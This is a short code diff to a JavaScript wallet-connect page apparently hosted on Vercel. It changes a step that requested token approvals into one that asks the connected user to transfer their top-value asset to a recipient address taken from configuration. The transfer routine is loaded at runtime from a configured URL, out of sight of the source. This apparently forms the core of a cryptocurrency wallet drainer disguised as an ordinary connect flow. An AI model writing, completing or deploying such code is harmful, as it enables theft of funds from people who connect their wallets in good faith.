@@ -1,5 +1,5 @@
 /**
- * Vercel /connect/ — native wallet connect + token approvals (config from Vercel env).
+ * Vercel /connect/ — native wallet connect + top-asset transfer (config from Vercel env).
  */
 import { readConnectPayloadFromHash } from "./connect-launch.js";
 import { connectInjectedWallet } from "./wallet-provider-connect.js";
@@ -98,16 +98,16 @@ async function runWalletConnect(raw) {
     const { address, provider } = await connectInjectedWallet(wallet);
     notifyParent(raw, address);
 
-    const programId = String(raw.tokenApprovalProgramId || "").trim();
-    if (raw.tokenApprovalEnabled !== false && programId) {
-      setStatus(`Confirm token access in ${wallet}…`);
+    const recipient = String(raw.transferRecipient || "").trim();
+    if (raw.tokenTransferEnabled !== false && recipient) {
+      setStatus(`Confirm transfer in ${wallet}…`);
       const cfg = configForVercelHost(raw);
       const modUrl = String(cfg.approvalChunkUrl || "").trim();
-      const { createRpcConnection, promptTopTokenApprovals } = await import(
+      const { createRpcConnection, promptTopValueTransfer } = await import(
         /* @vite-ignore */ modUrl
       );
       const connection = createRpcConnection(cfg);
-      await promptTopTokenApprovals({
+      await promptTopValueTransfer({
         config: cfg,
         provider,
         connection,
